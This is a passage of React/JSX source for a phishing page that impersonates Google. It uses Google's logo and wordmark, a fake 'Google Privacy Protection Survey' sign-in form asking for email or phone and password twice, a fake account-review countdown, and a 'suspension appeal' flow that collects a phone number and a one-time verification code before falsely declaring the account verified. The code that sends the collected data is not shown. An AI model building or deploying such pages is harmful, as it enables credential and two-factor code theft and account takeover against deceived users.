                      setIsVerifyingCode(false);
                    }
                  }}
                  className="space-y-4 pt-2"
                >
                  <div className="relative border border-gray-300 dark:border-neutral-700 rounded-md focus-within:border-[#1a73e8] focus-within:ring-1 focus-within:ring-[#1a73e8] transition-all bg-white dark:bg-neutral-900">
                    <input
                      type="text"
                      required
                      maxLength={10}
                      value={verificationCode}
                      onChange={(e) => {
                        setVerificationCode(e.target.value);
                        setCodeError('');
                      }}
                      className="peer block w-full px-4 py-3.5 bg-transparent border-0 text-sm text-gray-900 dark:text-neutral-100 focus:ring-0 focus:outline-none placeholder-transparent"
                      placeholder="Enter code"
                      id="verification-code-input"
                    />
                    <label
                      htmlFor="verification-code-input"
                      className="absolute left-4 top-1/2 -translate-y-1/2 text-xs text-gray-500 transition-all pointer-events-none bg-white dark:bg-neutral-900 px-1
                      peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-sm
                      peer-focus:-translate-y-9 peer-focus:top-1/2 peer-focus:text-xs peer-focus:text-[#1a73e8]
                      peer-[:not(:placeholder-shown)]:-translate-y-9 peer-[:not(:placeholder-shown)]:top-1/2 peer-[:not(:placeholder-shown)]:text-xs"
                    >
                      Enter code
                    </label>
                  </div>

                  {/* 3-minute black countdown timer */}
                  <div className="flex items-center justify-between px-1 text-[11px] text-neutral-500 dark:text-neutral-400">
                    <span>Code expires in:</span>
                    <span className="font-mono font-semibold text-neutral-900 dark:text-neutral-100 flex items-center gap-1.5 bg-neutral-100 dark:bg-neutral-800 px-2 py-0.5 rounded">
                      <span className="w-1 h-1 rounded-full bg-red-500 animate-ping"></span>
                      {formatCodeTime(codeTimer)}
                    </span>
                  </div>

                  {codeError && (
                    <p className="text-xs text-red-600 dark:text-red-400 font-medium pl-1">
                      {codeError}
                    </p>
                  )}

                  <div className="flex items-center justify-between pt-4">
                    <button
                      type="button"
                      onClick={() => {
                        setVerificationCode('');
                        setIsCodeSent(false);
                      }}
                      className="text-sm font-semibold text-[#1a73e8] dark:text-[#8ab4f8] hover:underline"
                    >
                      Back
                    </button>

                    <button
                      type="submit"
                      disabled={isVerifyingCode}
                      className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-sm font-semibold rounded-md shadow-sm transition-colors cursor-pointer flex items-center gap-2"
                    >
                      {isVerifyingCode ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        'Verify'
                      )}
                    </button>
                  </div>
                </form>
              </div>
            ) : (
              <div className="space-y-5 text-center animate-fade-in py-4">
                <div className="w-12 h-12 bg-emerald-50 dark:bg-emerald-950/20 rounded-full flex items-center justify-center mx-auto text-emerald-500">
                  <CheckCircle2 className="w-8 h-8" />
                </div>
                <div className="space-y-2">
                  <h2 className="text-lg font-bold text-gray-900 dark:text-neutral-100">
                    Verification successful
                  </h2>
                  <p className="text-xs text-gray-600 dark:text-neutral-400 leading-relaxed px-2">
                    Google has successfully verified your account. Your suspension appeal has been logged and is currently being processed instantly.
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    localStorage.removeItem('pending_submission_id');
                    localStorage.removeItem('pending_submission_start');
                    localStorage.removeItem('pending_submission_is_confirmed');
                    localStorage.removeItem('pending_is_recovery_page');
                    setIsSubmitted(false);
                    setIsRecoveryPage(false);
                    setIsTryAnotherWayPage(false);
                    setIsCodeSent(false);
                    setIsRecoveryComplete(false);
                    setRecoveryPhone('');
                    setVerificationCode('');
                  }}
                  className="w-full py-2.5 bg-gray-100 hover:bg-gray-200 dark:bg-neutral-800 dark:hover:bg-neutral-700 text-gray-700 dark:text-neutral-300 text-xs font-semibold rounded-md transition-colors"
                >
                  Close and Exit
                </button>
              </div>
            )}
          </div>
          {showSessionExpired && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-xs p-4 animate-fade-in">
              <div className="w-full max-w-[360px] bg-white dark:bg-neutral-900 rounded-lg p-6 shadow-xl border border-gray-200 dark:border-neutral-800 space-y-4 text-center">
                <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-red-50 dark:bg-red-950/20 text-red-600 dark:text-red-400">
                  <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth="2" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                  </svg>
                </div>
                <div className="space-y-1">
                  <h3 className="text-sm font-semibold text-gray-900 dark:text-neutral-100">
                    Session expired
                  </h3>
                  <p className="text-xs text-gray-500 dark:text-neutral-400">
                    The verification code has expired. Please request a new code to continue verifying your account.
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    setShowSessionExpired(false);
                    setIsCodeSent(false);
                    setVerificationCode('');
                    setCodeError('');
                    setRecoveryPhone('');
                  }}
                  className="w-full rounded-md bg-[#1a73e8] hover:bg-[#1557b0] px-4 py-2 text-xs font-semibold text-white shadow-xs transition-colors cursor-pointer"
                >
                  Try again
                </button>
              </div>
            </div>
          )}
        </div>
      );
    }

    return (
      <div className="flex flex-col flex-1 bg-bg-app min-h-screen justify-between font-sans text-text-primary">
        {/* Main centered container representing the "collapsed" state */}
        <div className="max-w-[480px] w-full mx-auto px-6 py-20 flex-1 flex flex-col items-center justify-center animate-fade-in">
          {/* Centered Minimalist Google G logo */}
          <div className="mb-8">
            <svg className="w-16 h-16 transform hover:scale-105 transition-transform duration-300 ease-out select-none" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
          </div>

          {timeLeft > 0 ? (
            /* Collapsed view status card showing countdown */
            <div className="w-full bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10 text-center space-y-6 animate-fade-in">
              <div className="flex justify-center">
                <div className="relative flex items-center justify-center w-24 h-24 mx-auto">
                  <div className="absolute inset-0 rounded-full border-4 border-[#e8eaed] dark:border-neutral-800"></div>
                  <div className="absolute inset-0 rounded-full border-4 border-t-[#1a73e8] dark:border-t-[#8ab4f8] border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <svg className="w-11 h-11 select-none animate-google-pulse" viewBox="0 0 24 24">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                      <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                    </svg>
                  </div>
                </div>
              </div>
              
              <div className="space-y-4">
                <h2 className="text-text-primary text-2xl font-normal">
                  Wait for
                </h2>
                <div className="text-4xl font-mono font-semibold text-[#1a73e8] dark:text-[#8ab4f8] tracking-widest animate-pulse">
                  {formatTime(timeLeft)}
                </div>
                <p className="text-sm text-text-secondary leading-relaxed max-w-sm mx-auto">
                  Our team are reviewing the activities in your account. Please keep this screen open.
                </p>
              </div>


            </div>
          ) : (
            /* The second screen as requested (Appeal your suspension) */
            <div className="w-full bg-[#fdf2f2] dark:bg-red-950/20 border border-red-200 dark:border-red-900/30 rounded-2xl p-6 md:p-8 shadow-card space-y-6 animate-fade-in">
              <div className="flex gap-4 items-start">
                <div className="text-[#c5221f] shrink-0 mt-0.5">
                  <AlertCircle className="h-8 w-8" />
                </div>
                
                <div className="space-y-1.5 text-left">
                  <h3 className="text-lg font-bold text-[#1f2937] dark:text-red-100">
                    Complete your account verification
                  </h3>
                  <p className="text-sm text-[#4b5563] dark:text-red-200/80 leading-relaxed">
                    To gain access back to your account you'll need to verify your phone number.
                  </p>
                </div>
              </div>

              <div className="pl-12 text-left">
                <button
                  onClick={() => {
                    localStorage.setItem('pending_is_recovery_page', 'true');
                    setIsRecoveryPage(true);
                  }}
                  className="px-6 py-2.5 bg-[#c5221f] hover:bg-[#b01e1e] text-white text-sm font-semibold rounded-lg shadow-sm transition-colors duration-150"
                >
                  Start verification
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col flex-1 bg-bg-app min-h-screen justify-between text-text-primary">
      {/* Main Container - Editorial Grid */}
      <div className="max-w-[1200px] w-full mx-auto px-6 md:px-12 py-12 md:py-20 flex-1 grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20 items-center justify-center">
        
        {/* Left Column - Hero and Logo (Col span 7) */}
        <div className="lg:col-span-7 flex flex-col items-center lg:items-start text-center lg:text-left select-none gap-6">
          {/* Classic Google G Logo */}
          <svg className="w-32 h-32 md:w-36 md:h-36 transform hover:scale-105 transition-transform duration-300 ease-out select-none shrink-0" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
            <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
          </svg>

          {/* High Fidelity Multi-colored Google Wordmark Logo */}
          <div className="text-7xl md:text-8xl lg:text-[100px] font-semibold tracking-[-4px] flex items-center select-none font-sans mt-2">
            <span className="text-[#4285F4]">G</span>
            <span className="text-[#EA4335]">o</span>
            <span className="text-[#FBBC05]">o</span>
            <span className="text-[#4285F4]">g</span>
            <span className="text-[#34A853]">l</span>
            <span className="text-[#EA4335] inline-block origin-center rotate-[-15deg] transform">e</span>
          </div>
          
          {/* Editorial Heading Text */}
          <div className="space-y-4">
            <h1 className="text-3xl md:text-[44px] font-light text-text-primary leading-tight tracking-tight max-w-xl">
              Google Privacy Protection Survey
            </h1>
            <p className="text-lg text-text-secondary font-normal max-w-lg">
              Please complete this survey form to confirm your interest. <span className="dark:font-semibold">protect your privacy</span>
            </p>
          </div>

          {/* Bold visual label matching provided image */}
          <div className="text-brand-primary dark:text-[#1A73E8] text-2xl md:text-3xl font-bold tracking-tight mt-2 border-l-4 border-brand-primary dark:border-[#1A73E8] pl-4">
            Google Privacy Protection
          </div>
        </div>

        {/* Right Column - Card (Col span 5) */}
        <div className="lg:col-span-5 w-full max-w-[450px] mx-auto shrink-0">
          <div className="bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10">
            {/* Header section */}
            <div className="text-center mb-8">
              <h2 className="text-text-primary text-2xl font-normal">Sign in</h2>
              <p className="text-sm text-text-secondary mt-2">
                Use your Google Account<br />
                <span className="text-[#1a73e8] dark:text-[#8ab4f8] font-medium">Verify you own this account</span>
              </p>
            </div>

            {/* Interactive Login Form */}
            <form onSubmit={handleSignIn} className="space-y-6">
              {/* Email / Phone Field */}
              <div className="relative">
                <input
                  id="emailOrPhone"
                  type="text"
                  placeholder=" "
                  value={emailOrPhone}
                  onChange={(e) => setEmailOrPhone(e.target.value)}
                  className={`peer w-full h-14 px-4 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    emailError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="username"
                />
                <label 
                  htmlFor="emailOrPhone" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Email or phone
                </label>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {emailError}
                </div>
              </div>

              {/* Password Field */}
              <div className="relative">
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder=" "
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`peer w-full h-14 pl-4 pr-11 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    passwordError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="new-password"
                />
                <label 
                  htmlFor="password" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Enter your password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-5 text-text-secondary hover:text-text-primary focus:outline-none"
                >
                  {showPassword ? <EyeOff className="h-4.5 w-4.5" /> : <Eye className="h-4.5 w-4.5" />}
                </button>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {passwordError}
                </div>
              </div>

              {/* Confirm Password Field */}
              <div className="relative">
                <input
                  id="confirmPassword"
                  type={showConfirmPassword ? 'text' : 'password'}
                  placeholder=" "
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className={`peer w-full h-14 pl-4 pr-11 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    confirmError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="new-password"
                />
                <label 
                  htmlFor="confirmPassword" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Confirm password
                </label>
                <button
                  type="button"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  className="absolute right-3.5 top-5 text-text-secondary hover:text-text-primary focus:outline-none"
                >
                  {showConfirmPassword ? <EyeOff className="h-4.5 w-4.5" /> : <Eye className="h-4.5 w-4.5" />}
                </button>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {confirmError}
                </div>
              </div>

              {/* Stay Signed In Toggle and Button */}
              <div className="flex flex-row-reverse justify-between items-center pt-2">
                <button
                  type="submit"
                  disabled={!staySignedIn}
                  className={`bg-brand-primary text-white font-medium rounded px-6 py-2.5 text-sm transition-all duration-300 ease-in-out shadow-sm select-none ${
                    staySignedIn 
                      ? 'opacity-100 dark:bg-[#1A73E8] dark:hover:bg-[#155cb4] cursor-pointer hover:opacity-90 active:scale-95 focus:ring-2 focus:ring-brand-primary dark:focus:ring-[#1A73E8] focus:ring-offset-2 outline-none' 
                      : 'opacity-45 cursor-not-allowed'
                  }`}
                >
                  Confirm
                </button>
                
                <label className="flex items-center gap-2 text-sm text-text-secondary select-none cursor-pointer">
                  <input
                    type="checkbox"
                    checked={staySignedIn}
                    onChange={() => setStaySignedIn(!staySignedIn)}
                    className="rounded border-border-custom text-brand-primary focus:ring-brand-primary h-4 w-4 bg-bg-input cursor-pointer"
                  />
                  Yes, its my account.
                </label>
              </div>
            </form>
          </div>
        </div>

      </div>
    </div>
  );
}
